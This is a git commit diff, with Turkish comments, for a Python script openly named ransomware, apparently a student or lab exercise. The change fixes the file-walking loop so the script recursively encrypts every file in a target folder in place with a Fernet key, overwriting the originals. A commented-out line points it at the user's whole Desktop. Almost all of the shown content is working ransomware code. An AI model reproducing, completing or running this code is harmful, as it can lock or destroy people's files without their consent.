67c205fcde58cf2d08b9184faedebff92f496cf8
Nesrin Atiktürk <79600556+nesrinatktrk@users.noreply.github.com>
2022-06-01 18:18:51 +0300

    Update ransomware_bilgisyar.py

--- ransomware_bilgisyar.py
+++ ransomware_bilgisyar.py
@@ -12,18 +12,26 @@ def dosyaAc(dosya):
         with open(dosya,"rb") as dosyam:
             return dosyam.read()  #Keyi daha sonra kullanmak için keyi oku
 
-    key = dosyaAc("key.txt") 
+key = dosyaAc("key.txt") 
 
-for kok,altdizin,dosya in os.walk("C:/Users/Nesrin/Desktop/bilgisayar"):         
+#adres=os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+#for kok,altdizin,dosya in os.walk(adres):
+
+
+for kok,altdizin,dosya in os.walk("C:/Users/ogr_8/Desktop/bilgisayar"):         
     for i in dosya:
+        path=(kok+"/"+i)
+        newPath = path.replace(os.sep, '/')
+        print(newPath)
+
+
         def sifrele(dosyalar,key):
             içerik=dosyaAc(dosyalar)
             f=Fernet(key)
             şifreliiçerik=f.encrypt(içerik)
             with open(dosyalar,"wb") as dosyalar:
                 dosyalar.write(şifreliiçerik)
-
-        sifrele(i,key)
-
+    
+        sifrele(newPath,key)
 
     
